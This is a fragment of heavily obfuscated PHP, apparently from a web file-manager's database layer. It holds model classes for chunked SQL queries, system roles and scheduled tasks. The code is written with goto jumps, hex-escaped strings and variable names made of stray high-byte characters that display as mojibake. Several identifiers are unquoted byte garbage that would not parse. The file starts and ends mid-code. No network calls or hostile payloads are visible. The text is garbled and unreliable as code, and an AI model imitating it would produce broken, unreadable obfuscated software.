D¬Ö¥ïä„é: $a¸Äé¯Ò¾ = 0; $F¡Ä¬­İŒ× = $Dä§¶È‚ïÚ; $this->chunkEventCheck(count($e™Ù¬× š)); goto FŠœÀàÓèÈ; EçÜ¦Ùä¯’: $d×ï¨›×øÑ = implode($b‘¾›šƒâ[47], $e™Ù¬× š); $F¡Ä¬­İŒ× .= "\40\x45\116\x44\40\x20\x57\x48\x45\x52\105\40{$eÓ“ó˜ñšÃ[0]}\x20\111\x4e\40\x28{$d×ï¨›×øÑ}\x29\x20"; $this->execute($F¡Ä¬­İŒ×); goto D¬Ö¥ïä„é; FŠœÀàÓèÈ: $e™Ù¬× š = array(); goto BÚŒÛ†²Ôí; BÚŒÛ†²Ôí: } } goto eòÈ®ê‘; cã¸ù‡˜Î¼: $fÒØº›šó = is_array($fÒØº›šó) ? $fÒØº›šó : array(); $F¡Ä¬­İŒ× = $b‘¾›šƒâ[375]; $a¸Äé¯Ò¾ = 0; goto e´¼ø•ùÄ; dõÀÌÈ”•¤: } public function saveAllEach($E¸ÊÂõÍÍ) { $eÜÅ‹ƒÂ®ã =& $_SERVER[«¾°Ã¤]; $d£ß¸›ä¬Ü = $this->tablePrefix . $this->tableName; foreach ($E¸ÊÂõÍÍ as $CÂ¡«óİÃÕ) { if (!is_array($CÂ¡«óİÃÕ) || count($CÂ¡«óİÃÕ) != 4) { continue; } $fÕéâÜ…” = $CÂ¡«óİÃÕ[0] . $eÜÅ‹ƒÂ®ã[376] . $CÂ¡«óİÃÕ[1] . $eÜÅ‹ƒÂ®ã[116]; $A‰œ°î”«Ç = $CÂ¡«óİÃÕ[2] . $eÜÅ‹ƒÂ®ã[376] . $CÂ¡«óİÃÕ[3] . $eÜÅ‹ƒÂ®ã[116]; $bãßˆÄóá’ = "\165\x70\x64\x61\164\145\40{$d£ß¸›ä¬Ü}\40\163\145\164\x20{$A‰œ°î”«Ç}\40\x77\150\145\x72\x65\40{$fÕéâÜ…”}\73"; $this->execute($bãßˆÄóá’); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($A™±×Îğé = false, $cÖó¾£Ìò¦ = false) { $this->_chunkEvent = $A™±×Îğé; $this->_chunkEventParam = $cÖó¾£Ìò¦; } private function chunkEventCheck($dº¨’œĞîÆ) { if (!$this->_chunkEvent) { return; } $fÀ¢â¤òÉ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $fÀ¢â¤òÉ[$_SERVER[«¾°Ã¤][377]] = $dº¨’œĞîÆ; Hook::trigger($this->_chunkEvent, $fÀ¢â¤òÉ); } public function addAll($eµ”½¡ÀŠâ, $fßÁà½ËÏõ = array(), $A¨‚º’•ñÑ = false) { goto D±ÍŒ›Ãê; fÏÊ‘¨«ƒ: if (empty($eµ”½¡ÀŠâ)) { $this->error = think_lang($bœŠÃ‹‡[269]); return !1; } $fßÁà½ËÏõ = $this->_parseOptions($fßÁà½ËÏõ); foreach ($eµ”½¡ÀŠâ as $aò²¦ˆá => $cœ’ŞŠˆ¬Ë) { $eµ”½¡ÀŠâ[$aò²¦ˆá] = $this->_facade($cœ’ŞŠˆ¬Ë); $this->_beforeInsert($eµ”½¡ÀŠâ[$aò²¦ˆá], $fßÁà½ËÏõ); } goto fÂ‡“¬Âš; fÂ‡“¬Âš: if (method_exists($this->db, $bœŠÃ‹‡[270])) { for ($eÃŒº©ãÔ¾ = 0; $eÃŒº©ãÔ¾ < count($eµ”½¡ÀŠâ); $eÃŒº©ãÔ¾ += $bÙæ’‚Œ×) { $dÅ§Œ‘•£ = array_slice($eµ”½¡ÀŠâ, $eÃŒº©ãÔ¾, $bÙæ’‚Œ×); if (!is_array($dÅ§Œ‘•£) || count($dÅ§Œ‘•£) == 0) { break; } $Bò…ÁŸÍÆ¨ = $this->db->insertAll($dÅ§Œ‘•£, $fßÁà½ËÏõ, $A¨‚º’•ñÑ); $this->chunkEventCheck(count($dÅ§Œ‘•£)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eµ”½¡ÀŠâ as $aò²¦ˆá => $cœ’ŞŠˆ¬Ë) { $Bò…ÁŸÍÆ¨ = $this->db->insert($cœ’ŞŠˆ¬Ë, $fßÁà½ËÏõ, $A¨‚º’•ñÑ); } $this->commit(); } if (!1 !== $Bò…ÁŸÍÆ¨) { $aãŠ¡øËñÛ = $this->getLastInsID(); if ($aãŠ¡øËñÛ) { return $aãŠ¡øËñÛ; } } return $Bò…ÁŸÍÆ¨; goto fŠÇíˆçÊ¬; D±ÍŒ›Ãê: $bœŠÃ‹‡ =& $_SERVER[«¾°Ã¤]; ignore_timeout(); $bÙæ’‚Œ× = self::SQL_WHERE_IN_CHUNK; goto fÏÊ‘¨«ƒ; fŠÇíˆçÊ¬: } public function save($fé¡“‘¸ó¨ = '', $C™Ã¸²¨İÒ = array()) { goto B¡Ï“¶ê‹; b×£Ó‰äËå: $dËÄí”‘‚ = $this->findWhereField($d„°ÉïÔßä); if (!$dËÄí”‘‚) { return parent::save($fé¡“‘¸ó¨, $C™Ã¸²¨İÒ); } $f÷ß¯—Ö¹² = 0; goto E×°İÊ·­; B¾Œé§”ÕÜ: for ($FÂ˜İÂàĞ§ = 0; $FÂ˜İÂàĞ§ < $CÅ—¹ƒ §; $FÂ˜İÂàĞ§ += $BÉÃŞÇä”²) { $fÈÇ‚òë’ = array_slice($c¬’¡ŸéÆ¼, $FÂ˜İÂàĞ§, $BÉÃŞÇä”²); if (!is_array($fÈÇ‚òë’) || count($fÈÇ‚òë’) == 0) { break; } $d„°ÉïÔßä[$bÈ½ŒæÍË[273]][$dËÄí”‘‚][1] = $fÈÇ‚òë’; $this->optionsValue($d„°ÉïÔßä); $f÷ß¯—Ö¹² += parent::save($fé¡“‘¸ó¨, $C™Ã¸²¨İÒ); $this->chunkEventCheck(count($fÈÇ‚òë’)); } $this->chunkEventSet(); return $f÷ß¯—Ö¹²; goto e–ŸÁêÍ; B¡Ï“¶ê‹: $bÈ½ŒæÍË =& $_SERVER[«¾°Ã¤]; $BÉÃŞÇä”² = self::SQL_WHERE_IN_CHUNK; $d„°ÉïÔßä = $this->optionsValue(); goto b×£Ó‰äËå; E×°İÊ·­: $c¬’¡ŸéÆ¼ = $d„°ÉïÔßä[$bÈ½ŒæÍË[273]][$dËÄí”‘‚][1]; $c¬’¡ŸéÆ¼ = is_array($c¬’¡ŸéÆ¼) ? $c¬’¡ŸéÆ¼ : array(); $CÅ—¹ƒ § = count($c¬’¡ŸéÆ¼); goto B¾Œé§”ÕÜ; e–ŸÁêÍ: } public function add($cçãÆöõ’ = '', $DÌÉ¥Á•ùˆ = array(), $Aì‰Ş™ïğõ = false) { if ($this->addTaskStatus && is_array($cçãÆöõ’)) { $this->addTaskData[] = $cçãÆöõ’; return; } return parent::add($cçãÆöõ’, $DÌÉ¥Á•ùˆ, $Aì‰Ş™ïğõ); } public function parseWhereLike($dÕ±æÀä, $c¬ïÓòÅä” = '', $Eã‚½ĞÊ®µ = false, &$FÂåñà‚Œ‘ = false) { goto ağéÔ·öÊ‰; f°šöÆøäÈ: foreach ($dÕ±æÀä as $D®¸ê–¢Ê => $fĞ‹Æ²Ëåõ) { if (is_array($fĞ‹Æ²Ëåõ) && count($fĞ‹Æ²Ëåõ) == 2 && $fĞ‹Æ²Ëåõ[0] == $a“Üò²ŒÙŠ[380] && is_string($fĞ‹Æ²Ëåõ[1]) && substr($fĞ‹Æ²Ëåõ[1], 0, 1) == $a“Üò²ŒÙŠ[381] && substr($fĞ‹Æ²Ëåõ[1], strlen($fĞ‹Æ²Ëåõ[1]) - 1, 1) == $a“Üò²ŒÙŠ[381]) { goto D×ù—ˆ©Ö; B­ÔøßÈéƒ: continue; goto e“”ï¸Ü‹Å; F§ÎÙ¯…Á: $BöŸšŠ÷‰Ó = $this->db->escapeString($BöŸšŠ÷‰Ó); if (!strpos($bÀ–Äî¥, $a“Üò²ŒÙŠ[95])) { $bÀ–Äî¥ = $a“Üò²ŒÙŠ[382] . $bÀ–Äî¥ . $a“Üò²ŒÙŠ[382]; } $b¶¡Êíä¿õ = $a“Üò²ŒÙŠ[182] . $BöŸšŠ÷‰Ó . $a“Üò²ŒÙŠ[182]; goto cÌĞ„Ş«æÔ; D×ù—ˆ©Ö: $FÂåñà‚Œ‘ = !0; $bÀ–Äî¥ = is_string($D®¸ê–¢Ê) ? $D®¸ê–¢Ê : $c¬ïÓòÅä”; $BöŸšŠ÷‰Ó = substr($fĞ‹Æ²Ëåõ[1], 1, strlen($fĞ‹Æ²Ëåõ[1]) - 2); goto F§ÎÙ¯…Á; cÌĞ„Ş«æÔ: if ($f‹›ˆ„œ‡§[$a“Üò²ŒÙŠ[383]]) { $b¶¡Êíä¿õ = $a“Üò²ŒÙŠ[384] . $BöŸšŠ÷‰Ó . $a“Üò²ŒÙŠ[385]; if ($f‹›ˆ„œ‡§[$a“Üò²ŒÙŠ[386]]) { $b¶¡Êíä¿õ = $a“Üò²ŒÙŠ[385] . $BöŸšŠ÷‰Ó . $a“Üò²ŒÙŠ[384]; } } $E¢Ä¥¸±ŠÙ[$AŠø‰‹øâ§] = $a“Üò²ŒÙŠ[387] . $bÀ–Äî¥ . $a“Üò²ŒÙŠ[388] . $b¶¡Êíä¿õ . $a“Üò²ŒÙŠ[389]; $AŠø‰‹øâ§++; goto B­ÔøßÈéƒ; e“”ï¸Ü‹Å: } if (is_array($fĞ‹Æ²Ëåõ)) { $c¬ïÓòÅä” = is_string($D®¸ê–¢Ê) ? $D®¸ê–¢Ê : $c¬ïÓòÅä”; $fĞ‹Æ²Ëåõ = $this->parseWhereLike($fĞ‹Æ²Ëåõ, $c¬ïÓòÅä”, !0, $FÂåñà‚Œ‘); } if (is_numeric($D®¸ê–¢Ê)) { $E¢Ä¥¸±ŠÙ[$AŠø‰‹øâ§] = $fĞ‹Æ²Ëåõ; $AŠø‰‹øâ§++; } else { $E¢Ä¥¸±ŠÙ[$D®¸ê–¢Ê] = $fĞ‹Æ²Ëåõ; } } if ($FÂåñà‚Œ‘ && !$Eã‚½ĞÊ®µ) { } return $E¢Ä¥¸±ŠÙ; goto EÅÈ«¿Œï; ağéÔ·öÊ‰: $a“Üò²ŒÙŠ =& $_SERVER[«¾°Ã¤]; $f‹›ˆ„œ‡§ = $GLOBALS[$a“Üò²ŒÙŠ[6]][$a“Üò²ŒÙŠ[378]]; if (!$f‹›ˆ„œ‡§[$a“Üò²ŒÙŠ[379]]) { return $dÕ±æÀä; } goto eÖñ†Û†²; eÖñ†Û†²: if (!is_array($dÕ±æÀä)) { return $dÕ±æÀä; } $E¢Ä¥¸±ŠÙ = array(); $AŠø‰‹øâ§ = 0; goto f°šöÆøäÈ; EÅÈ«¿Œï: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($dªà‚¢© = array()) { goto aÄ…é‚ÏÅ; AØÇÛ¸®¶Û: return $cñ®Öä¬¹È; goto EÉ‘”ôÎ¶; Cˆô¬À¿İø: $dÃöÎ•¾‡µ = is_array($dÃöÎ•¾‡µ) ? $dÃöÎ•¾‡µ : array(); $cñ®Öä¬¹È = null; for ($Bì¦ˆ™ŒÂ = 0; $Bì¦ˆ™ŒÂ < count($dÃöÎ•¾‡µ); $Bì¦ˆ™ŒÂ += $eêËİŞ’ÙÕ) { $EÇÓîãø = array_slice($dÃöÎ•¾‡µ, $Bì¦ˆ™ŒÂ, $eêËİŞ’ÙÕ); if (!is_array($EÇÓîãø) || count($EÇÓîãø) == 0) { break; } $AÙØ‡¨Ôñ»[$eÀÑÄÀ“ …[273]][$Câ‡‡ÕÄ±][1] = $EÇÓîãø; $this->optionsValue($AÙØ‡¨Ôñ»); $B²Î§÷Ğç‘ = parent::select($dªà‚¢©); if (!$B²Î§÷Ğç‘) { continue; } $cñ®Öä¬¹È = is_array($cñ®Öä¬¹È) ? $cñ®Öä¬¹È : array(); $cñ®Öä¬¹È = array_merge($cñ®Öä¬¹È, $B²Î§÷Ğç‘); } goto AØÇÛ¸®¶Û; aÄ…é‚ÏÅ: $eÀÑÄÀ“ … =& $_SERVER[«¾°Ã¤]; $eêËİŞ’ÙÕ = self::SQL_WHERE_IN_CHUNK; $AÙØ‡¨Ôñ» = $this->optionsValue(); goto cæõàÜ¿‹²; cæõàÜ¿‹²: $Câ‡‡ÕÄ± = $this->findWhereField($AÙØ‡¨Ôñ»); if (!$Câ‡‡ÕÄ± || isset($AÙØ‡¨Ôñ»[$eÀÑÄÀ“ …[290]]) || isset($AÙØ‡¨Ôñ»[$eÀÑÄÀ“ …[351]])) { return parent::select($dªà‚¢©); } $dÃöÎ•¾‡µ = $AÙØ‡¨Ôñ»[$eÀÑÄÀ“ …[273]][$Câ‡‡ÕÄ±][1]; goto Cˆô¬À¿İø; EÉ‘”ôÎ¶: } public function delete($Föù¬‹Á·¸ = array()) { goto cª¯’Ì·½; CšÂ†”‡¦ß: $CÚµ¤ô¡Ùå = $this->findWhereField($aÈ¸îƒŠ Æ); if (!$CÚµ¤ô¡Ùå) { return parent::delete($Föù¬‹Á·¸); } $f—Í»‚ó¾‚ = 0; goto b¨ôõ¦ —; fáæ´÷Ş³„: return $f—Í»‚ó¾‚; goto E•ÊõÑİÁ; cª¯’Ì·½: $CóÔ´Âì°ƒ =& $_SERVER[«¾°Ã¤]; $D¦Á®³¹ó… = self::SQL_WHERE_IN_CHUNK; $aÈ¸îƒŠ Æ = $this->optionsValue(); goto CšÂ†”‡¦ß; b¨ôõ¦ —: $fÓÖÙ­Ì¡” = $aÈ¸îƒŠ Æ[$CóÔ´Âì°ƒ[273]][$CÚµ¤ô¡Ùå][1]; $fÓÖÙ­Ì¡” = is_array($fÓÖÙ­Ì¡”) ? $fÓÖÙ­Ì¡” : array(); for ($C¡ø²ïÉ²Ó = 0; $C¡ø²ïÉ²Ó < count($fÓÖÙ­Ì¡”); $C¡ø²ïÉ²Ó += $D¦Á®³¹ó…) { $B–ª¸ÖÖƒ = array_slice($fÓÖÙ­Ì¡”, $C¡ø²ïÉ²Ó, $D¦Á®³¹ó…); if (!is_array($B–ª¸ÖÖƒ) || count($B–ª¸ÖÖƒ) == 0) { break; } $aÈ¸îƒŠ Æ[$CóÔ´Âì°ƒ[273]][$CÚµ¤ô¡Ùå][1] = $B–ª¸ÖÖƒ; $this->optionsValue($aÈ¸îƒŠ Æ); $f—Í»‚ó¾‚ += parent::delete($Föù¬‹Á·¸); } goto fáæ´÷Ş³„; E•ÊõÑİÁ: } private function findWhereField($b‘ùÈ„ïÂ½) { $dÃòä–Ìê½ =& $_SERVER[«¾°Ã¤]; $FÎ÷ƒí’£­ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b‘ùÈ„ïÂ½) || !is_array($b‘ùÈ„ïÂ½[$dÃòä–Ìê½[273]])) { return !1; } foreach ($b‘ùÈ„ïÂ½[$dÃòä–Ìê½[273]] as $dŸÌÅóë¿‘ => $a¼„‘ò¬†´) { if (is_array($a¼„‘ò¬†´) && isset($a¼„‘ò¬†´[0]) && is_string($a¼„‘ò¬†´[0]) && strtolower($a¼„‘ò¬†´[0]) == $dÃòä–Ìê½[7] && is_array($a¼„‘ò¬†´[1]) && count($a¼„‘ò¬†´[1]) > $FÎ÷ƒí’£­) { ignore_timeout(); return $dŸÌÅóë¿‘; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\117\160\x74\x69\157\x6e"; public $field = array(); public function listData($AÓ‰‘…Æé· = false, $e‹±’øÔˆ‰ = "\x6d\x6f\144\151\x66\x79\124\x69\155\x65", $EÑ·¨…¿ğ = false) { $aÜÏ®‡Äë = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$aÜÏ®‡Äë) { return $AÓ‰‘…Æé· ? null : array(); } if (!$AÓ‰‘…Æé·) { $aÜÏ®‡Äë = array_filter(array_values($aÜÏ®‡Äë)); return array_sort_by($aÜÏ®‡Äë, $e‹±’øÔˆ‰, $EÑ·¨…¿ğ); } return $aÜÏ®‡Äë[$_SERVER[«¾°Ã¤][390] . $AÓ‰‘…Æé·]; } public function insert($d„á¥ˆ•ï³) { goto BÅ‚—ÇÀŸê; BÅ‚—ÇÀŸê: $c¤íê¤Ñ¬÷ =& $_SERVER[«¾°Ã¤]; $d„á¥ˆ•ï³ = array_field_key($d„á¥ˆ•ï³, $this->field); $C÷Ç½‚µÛ = Model($this->modelType)->get($c¤íê¤Ñ¬÷[391], $this->optionType . $c¤íê¤Ñ¬÷[392]); goto E×ŸÄ‡˜™Ã; B³³£†â‘»: $d„á¥ˆ•ï³[$c¤íê¤Ñ¬÷[84]] = time(); Model($this->modelType)->set($c¤íê¤Ñ¬÷[391], $C÷Ç½‚µÛ, $this->optionType . $c¤íê¤Ñ¬÷[392]); Model($this->modelType)->set($c¤íê¤Ñ¬÷[390] . $C÷Ç½‚µÛ, $d„á¥ˆ•ï³, $this->optionType); goto e¶ÏäªšŸÊ; e¶ÏäªšŸÊ: return $C÷Ç½‚µÛ; goto AˆÎ£¨†½Ğ; E×ŸÄ‡˜™Ã: $C÷Ç½‚µÛ = $C÷Ç½‚µÛ ? $C÷Ç½‚µÛ : 0; $d„á¥ˆ•ï³[$c¤íê¤Ñ¬÷[393]] = ++$C÷Ç½‚µÛ; $d„á¥ˆ•ï³[$c¤íê¤Ñ¬÷[194]] = time(); goto B³³£†â‘»; AˆÎ£¨†½Ğ: } public function update($c‰ğš˜Æ­’, $BšÍÍ“å£’) { goto B²ˆ¡ÄŒ¥; B²ˆ¡ÄŒ¥: $aˆ’ÑÈ„‚Ê =& $_SERVER[«¾°Ã¤]; $BšÍÍ“å£’ = array_field_key($BšÍÍ“å£’, $this->field); $DÇ“ÕŞ¥¹² = $this->listData($c‰ğš˜Æ­’); goto B¼ˆ»×íÅÑ; F‚áÔÂÙˆÖ: return Model($this->modelType)->set($aˆ’ÑÈ„‚Ê[390] . $c‰ğš˜Æ­’, $BšÍÍ“å£’, $this->optionType); goto BÓ£ ßØö; B¼ˆ»×íÅÑ: if (!$DÇ“ÕŞ¥¹²) { return !1; } $BšÍÍ“å£’ = array_merge($DÇ“ÕŞ¥¹², $BšÍÍ“å£’); $BšÍÍ“å£’[$aˆ’ÑÈ„‚Ê[84]] = time(); goto F‚áÔÂÙˆÖ; BÓ£ ßØö: } public function remove($d›£ÇÑéÚ—) { return Model($this->modelType)->remove($_SERVER[«¾°Ã¤][390] . $d›£ÇÑéÚ—, $this->optionType); } public function clear() { $e“Öªœ¯—Ş =& $_SERVER[«¾°Ã¤]; Model($this->modelType)->remove($e“Öªœ¯—Ş[391], $this->optionType . $e“Öªœ¯—Ş[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($C–ùµ­‰èó, $f¹®Ù‰Ö¡) { if (!$f¹®Ù‰Ö¡) { return !1; } $d…øØâİœ = $this->listData(); $d…øØâİœ = array_to_keyvalue($d…øØâİœ, $C–ùµ­‰èó); return isset($d…øØâİœ[$f¹®Ù‰Ö¡]) ? $d…øØâİœ[$f¹®Ù‰Ö¡] : !1; } public function findByName($Aíõ¬²­©ô) { return $this->findByKey($_SERVER[«¾°Ã¤][28], $Aíõ¬²­©ô); } protected function resetData($C¥ŸÒ¸ø—¢) { $eŒ¿’Åæ =& $_SERVER[«¾°Ã¤]; $C¥ŸÒ¸ø—¢ = is_array($C¥ŸÒ¸ø—¢) ? $C¥ŸÒ¸ø—¢ : array(); $Cãåºö¨Ñ = array(); for ($CÜ½æçˆõê = 0; $CÜ½æçˆõê < count($C¥ŸÒ¸ø—¢); $CÜ½æçˆõê++) { $Cãåºö¨Ñ[$eŒ¿’Åæ[390] . $C¥ŸÒ¸ø—¢[$CÜ½æçˆõê][$eŒ¿’Åæ[393]]] = $C¥ŸÒ¸ø—¢[$CÜ½æçˆõê]; } return Model($this->modelType)->set($Cãåºö¨Ñ, !1, $this->optionType); } private function getAutoName($FŠÆ¶ÈáÎõ) { $BÍÛ—îëİ  = array_to_keyvalue($this->listData(), $_SERVER[«¾°Ã¤][28]); if (!$BÍÛ—îëİ  || !isset($BÍÛ—îëİ [$FŠÆ¶ÈáÎõ])) { return $FŠÆ¶ÈáÎõ; } for ($f‘Èù¿ŠõË = 1; $f‘Èù¿ŠõË < count($BÍÛ—îëİ ); $f‘Èù¿ŠõË++) { $CÁö½óù®ª = $FŠÆ¶ÈáÎõ . "\x28{$f‘Èù¿ŠõË}\51"; if (!isset($BÍÛ—îëİ [$CÁö½óù®ª])) { return $CÁö½óù®ª; } } return $CÁö½óù®ª; } } $AÎ„ìÜß = $_SERVER[$_SERVER[«¾°Ã¤][394]]; goto f‡ìôáåÂé; E¤ÎÄ¥ ¹Ë: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\162\157\x6c\145\114\151\163\164"; public $field = array("\156\141\x6d\145", "\141\165\164\150", "\154\x61\x62\145\x6c", "\144\x69\163\160\154\141\171", "\163\x79\x73\x74\145\x6d", "\144\145\163\x63", "\151\x67\x6e\x6f\162\x65\105\170\x74", "\x69\147\x6e\x6f\x72\145\106\x69\154\x65\x53\x69\x7a\x65", "\x61\x64\x6d\151\156\x69\x73\x74\162\x61\x74\x6f\162", "\163\157\x72\x74"); public function listData($e‹Ùñ¥Ö‹à = false, $c•†Üã¢Õ– = "\x73\157\162\164", $b®ËÁÇ×À = false) { $BøÑõøœÒ¸ =& $_SERVER[«¾°Ã¤]; $C†×¼ˆæ° = parent::listData($e‹Ùñ¥Ö‹à, $c•†Üã¢Õ–, $b®ËÁÇ×À); if (!$e‹Ùñ¥Ö‹à) { foreach ($C†×¼ˆæ° as $fÍ›ƒÓ‰ƒ => $b¥óŠîØ›Ö) { if ($b¥óŠîØ›Ö[$BøÑõøœÒ¸[1882]] == 1) { $C†×¼ˆæ°[$fÍ›ƒÓ‰ƒ][$BøÑõøœÒ¸[440]] = LNG($BøÑõøœÒ¸[2108]); } } } return $C†×¼ˆæ°; } public function update($A§½’à±»Â, $B‹ìè²ˆĞ) { goto F¦Ë¾ãÂÏ¶; dÔ¡íÊçÇ´: if (!$cºøÛ„«¥² || $BñëŸªëˆ  && $BñëŸªëˆ [$A¸åêãˆ†[393]] != $cºøÛ„«¥²[$A¸åêãˆ†[393]]) { return !1; } if ($BñëŸªëˆ [$A¸åêãˆ†[1882]] == 1) { $B‹ìè²ˆĞ = array($A¸åêãˆ†[28] => $B‹ìè²ˆĞ[$A¸åêãˆ†[28]], $A¸åêãˆ†[1714] => $B‹ìè²ˆĞ[$A¸åêãˆ†[1714]]); } $this->filterAuth($B‹ìè²ˆĞ[$A¸åêãˆ†[415]]); goto F…¿•¡áÔ; F…¿•¡áÔ: return parent::update($A§½’à±»Â, $B‹ìè²ˆĞ); goto fº‡ê’°Â; F¦Ë¾ãÂÏ¶: $A¸åêãˆ† =& $_SERVER[«¾°Ã¤]; $cºøÛ„«¥² = parent::listData($A§½’à±»Â); $BñëŸªëˆ  = $this->findByName($B‹ìè²ˆĞ[$A¸åêãˆ†[28]]); goto dÔ¡íÊçÇ´; fº‡ê’°Â: } public function remove($AÕ†é³×èö) { $Aî½†©›°Š = parent::listData($AÕ†é³×èö); if (!$Aî½†©›°Š || $Aî½†©›°Š[$_SERVER[«¾°Ã¤][1172]]) { return !1; } return parent::remove($AÕ†é³×èö); } public function add($e§Ğ¶»ãéˆ) { goto a»©ìÕ™‘‹; a»©ìÕ™‘‹: $BŠ–ÇŒÛ‹ =& $_SERVER[«¾°Ã¤]; $bŸÊ‘‡ÁÈ± = $e§Ğ¶»ãéˆ[$BŠ–ÇŒÛ‹[28]]; if ($this->findByName($bŸÊ‘‡ÁÈ±)) { return !1; } goto dèÅÍö©¥À; dèÅÍö©¥À: $eö´†ŒƒêÕ = array($BŠ–ÇŒÛ‹[422] => $bŸÊ‘‡ÁÈ±, $BŠ–ÇŒÛ‹[1699] => $BŠ–ÇŒÛ‹[33], $BŠ–ÇŒÛ‹[1695] => $BŠ–ÇŒÛ‹[1703], $BŠ–ÇŒÛ‹[2109] => 1, $BŠ–ÇŒÛ‹[1698] => 0, $BŠ–ÇŒÛ‹[2110] => 0, $BŠ–ÇŒÛ‹[1697] => $this->getSort()); $e§Ğ¶»ãéˆ = array_merge($eö´†ŒƒêÕ, $e§Ğ¶»ãéˆ); $this->filterAuth($e§Ğ¶»ãéˆ[$BŠ–ÇŒÛ‹[415]]); goto FÇ¤ô‰†›; FÇ¤ô‰†›: return parent::insert($e§Ğ¶»ãéˆ); goto d°ºøƒ÷ğÚ; d°ºøƒ÷ğÚ: } private function getSort() { $aÒ¹óï˜¯  =& $_SERVER[«¾°Ã¤]; $f­Ô™Ğè—ö = parent::listData(); $bÁ‡Ú¤‹‘— = array_to_keyvalue($f­Ô™Ğè—ö, $aÒ¹óï˜¯ [33], $aÒ¹óï˜¯ [1716]); return empty($bÁ‡Ú¤‹‘—) ? 0 : max($bÁ‡Ú¤‹‘—) + 1; } private function filterAuth(&$b¯Éê¡ÏïÄ) { $aŒÀ‚¾Ó¤Ï =& $_SERVER[«¾°Ã¤]; $AÍèãŒâÇÁ = array(); $B‰µÍ§Œ˜¨ = array_filter(explode($aŒÀ‚¾Ó¤Ï[47], $b¯Éê¡ÏïÄ)); foreach ($B‰µÍ§Œ˜¨ as $b¯Éê¡ÏïÄ) { $Fãõ¦²»Ğ£ = explode($aŒÀ‚¾Ó¤Ï[95], $b¯Éê¡ÏïÄ); if ($Fãõ¦²»Ğ£[0] == $aŒÀ‚¾Ó¤Ï[2111] && $Fãõ¦²»Ğ£[1] != $aŒÀ‚¾Ó¤Ï[1091]) { $fÍŞ°§´×â = $Fãõ¦²»Ğ£[0] . $aŒÀ‚¾Ó¤Ï[95] . $Fãõ¦²»Ğ£[1] . $aŒÀ‚¾Ó¤Ï[2112]; if (!in_array($fÍŞ°§´×â, $B‰µÍ§Œ˜¨)) { $AÍèãŒâÇÁ[] = $fÍŞ°§´×â; } } $AÍèãŒâÇÁ[] = $b¯Éê¡ÏïÄ; } $b¯Éê¡ÏïÄ = implode($aŒÀ‚¾Ó¤Ï[47], $AÍèãŒâÇÁ); } public function sort($b„÷ÀÑç‹, $fàæ·¦Í¿) { return parent::update($b„÷ÀÑç‹, $fàæ·¦Í¿); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x74\141\163\x6b\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\164\x79\x70\145", "\145\166\x65\156\x74", "\x74\151\x6d\145", "\144\x65\x73\x63", "\x73\x79\x73\164\145\155", "\145\156\x61\142\x6c\x65", "\154\141\x73\x74\122\x75\156", "\163\x6f\162\x74"); public function listData($d¥ÃÍ¾Âã„ = false, $Cõë²–È÷¼ = "\x73\x6f\x72\x74", $BõÚË—ßİé = false) { return parent::listData($d¥ÃÍ¾Âã„, $Cõë²–È÷¼, $BõÚË—ßİé); } public function add($Eô¬«†ãÆ) { $cŒ…Ú‰Í¬ =& $_SERVER[«¾°Ã¤]; $a³…ìì„¯Ø = $this->findByName($Eô¬«†ãÆ[$cŒ…Ú‰Í¬[28]]); if ($a³…ìì„¯Ø) { return !1; } $Eô¬«†ãÆ[$cŒ…Ú‰Í¬[1494]] = 0; $Eô¬«†ãÆ[$cŒ…Ú‰Í¬[1716]] = $this->getSort(); return parent::insert($Eô¬«†ãÆ); } private function getSort() { $C«ÙÛÑŸ“ó =& $_SERVER[«¾°Ã¤]; $Bï¨…îÍò = parent::listData(); $c²º¡Ê = array_to_keyvalue($Bï¨…îÍò, $C«ÙÛÑŸ“ó[33], $C«ÙÛÑŸ“ó[1716]); return empty($c²º¡Ê) ? 0 : max($c²º¡Ê) + 1; } public function update($aªé…²¼¶¤, $c½ïæËîòÈ) { $A­ÏÕÂ ’¹ =& $_SERVER[«¾°Ã¤]; $fè—×ƒ‡² = $this->listData($aªé…²¼¶¤); $aÂ·‹¨Îñ = $this->findByName($c½ïæËîòÈ[$A­ÏÕÂ ’¹[28]]); if (!$fè—×ƒ‡² || $aÂ·‹¨Îñ && $aÂ·‹¨Îñ[$A­ÏÕÂ ’¹[393]] != $fè—×ƒ‡²[$A­ÏÕÂ ’¹[393]]) { return !1; } return parent::update($aªé…²¼¶¤, $c½ïæËîòÈ); } public function remove($b°´š†ç¤Ò, $DˆÛÈÑÇ = false) { $B±ä·§õ‹š =& $_SERVER[«¾°Ã¤]; $C²åÒÀÀï = $this->listData($b°´š†ç¤Ò); if (!$C²åÒÀÀï) { return; } if (!$DˆÛÈÑÇ && $C²åÒÀÀï[$B±ä·§õ‹š[1172]] == $B±ä·§õ‹š[87]) { return !1; } return parent::remove($b°´š†ç¤Ò); } public function enable($a¶¤Á ÄŞï, $F¬ÏÉ—¥éÏ) { return $this->update($a¶¤Á ÄŞï, array($_SERVER[«¾°Ã¤][2103] => $F¬ÏÉ—¥éÏ)); } public function run($EÔÌÏ©øå) { return $this->update($EÔÌÏ©øå, array($_SERVER[«¾°Ã¤][2113] => time())); } } goto FÙ¿ÜîÙ; a‹™Í„¬: function binCheckBigger($e×Í’ŸÒåğ, $fíà®ªÆæµ) { return $e×Í’ŸÒåğ > $fíà®ªÆæµ; } $_SERVER[$_SERVER[ã…][3]] = ("\71\60\65\62"."\x37\x33")+0;$_kzPc="SKGC3quA3wI8cZSdfiaIpRErsrZY2yB75SdM3HxSeMsyVs6DnNPiy5Nd6e9HbU2HQXVRmkADnqfAIxTr";; class 